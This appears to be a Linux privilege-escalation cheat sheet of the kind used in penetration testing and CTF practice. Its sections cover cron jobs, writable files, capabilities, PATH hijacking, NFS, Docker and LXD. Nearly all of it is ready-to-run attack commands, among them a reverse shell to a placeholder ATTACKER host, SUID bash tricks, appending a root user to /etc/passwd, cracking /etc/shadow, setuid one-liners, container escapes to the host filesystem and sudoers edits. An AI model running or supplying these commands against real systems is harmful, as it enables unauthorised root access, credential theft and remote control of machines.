04 · Cron Jobs
Find Cron Jobs
$ crontab -l $ cat /etc/crontab $ ls -la /etc/cron.d/ $ ls -la /etc/cron.{hourly,daily,weekly}/ $ cat /var/spool/cron/crontabs/root $ ./pspy64 # monitor live
Writable Cron Script
# If script is writable: $ echo 'chmod +s /bin/bash' >> /path/to/script.sh # Wait for cron, then: $ bash -p
# Or add reverse shell: $ echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> script.sh
PATH Hijacking via Cron
# crontab uses PATH=/usr/sbin:/usr/bin # If cron calls script without full path: $ echo '#!/bin/bash' > /tmp/script.sh $ echo 'chmod +s /bin/bash' >> /tmp/script.sh $ chmod +x /tmp/script.sh # Ensure /tmp is earlier in PATH
05 · File Permissions & Writable Files
World-Writable Files
$ find / -writable -type f 2>/dev/null | grep -v proc $ find / -perm -o+w -type f 2>/dev/null $ find / -perm -222 -type d 2>/dev/null # writable dirs
/etc/passwd Writable
# Generate password hash: $ openssl passwd -1 -salt abc password123 # Add root user: $ echo 'evil:$1$abc$HASH:0:0::/root:/bin/bash' >> /etc/passwd $ su evil
/etc/shadow Readable
$ cat /etc/shadow # Crack with hashcat: $ hashcat -m 1800 shadow.txt rockyou.txt # Crack with john: $ unshadow passwd shadow > hashes.txt $ john hashes.txt --wordlist=rockyou.txt
06 · Linux Capabilities
Find Capabilities
$ getcap -r / 2>/dev/null # Look for dangerous ones:
  • cap_setuid+ep — set UID to root
  • cap_net_raw+ep — raw sockets
  • cap_sys_admin — almost root
  • cap_dac_read_search — read any file
  • cap_sys_ptrace — process injection
Capability Exploitation
# python3 cap_setuid+ep $ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# perl cap_setuid+ep $ perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'
# vim cap_dac_read_search $ vim /etc/shadow
07 · PATH Hijacking
PATH Injection
# If SUID binary calls command without full path: # e.g. system("ps") instead of system("/bin/ps")
$ echo '/bin/bash' > /tmp/ps $ chmod +x /tmp/ps $ export PATH=/tmp:$PATH $ ./vulnerable_suid_binary
Find PATH Vulnerability
# Decompile / strings to check calls: $ strings /path/to/suid_binary $ strace ./binary 2>&1 | grep exec $ ltrace ./binary 2>&1 # Check for relative path calls (no leading /)

10 · NFS · Docker · LXC · Misc
NFS no_root_squash
$ cat /etc/exports # On attacker: $ showmount -e TARGET $ mount -t nfs TARGET:/share /mnt/nfs # Copy bash, setuid: $ cp /bin/bash /mnt/nfs/bash $ chmod +s /mnt/nfs/bash
Docker Group
$ id # check for docker group $ docker images # Mount host FS: $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
LXC/LXD Group
$ id # check for lxd group # Import Alpine image: $ lxc image import alpine.tar.gz --alias myimage $ lxc init myimage priv -c security.privileged=true $ lxc config device add priv host-root disk source=/ path=/mnt/root $ lxc start priv && lxc exec priv /bin/sh
Writable /etc/sudoers
$ ls -la /etc/sudoers # If writable: $ echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers $ sudo bash
